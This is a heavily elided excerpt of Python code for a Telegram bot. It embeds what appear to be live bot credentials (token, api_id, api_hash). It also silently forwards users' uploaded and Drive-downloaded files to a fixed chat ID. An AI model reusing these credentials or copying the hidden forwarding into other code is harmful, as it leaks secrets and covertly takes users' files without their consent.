...
bot = Client("bot",
             bot_token= "7014636983:AAELoi5MU1nTuS91Uh_RgZG2vBk_pHwAK4A",
             api_id= 22867163,
             api_hash= "a633197e388c9235b4d0032d921c59dd")
...
async def account_login(bot: Client, m: Message):
    ...
    if input.document:
        ...
        await bot.send_document(-1001934236256, x)
            ...
            try:                               
                ...
                if "drive" in url:
                    try:
                        ...
                        await copy.copy(chat_id = -1001934236256)
                        count+=1
                        os.remove(ka)
                        time.sleep(1)
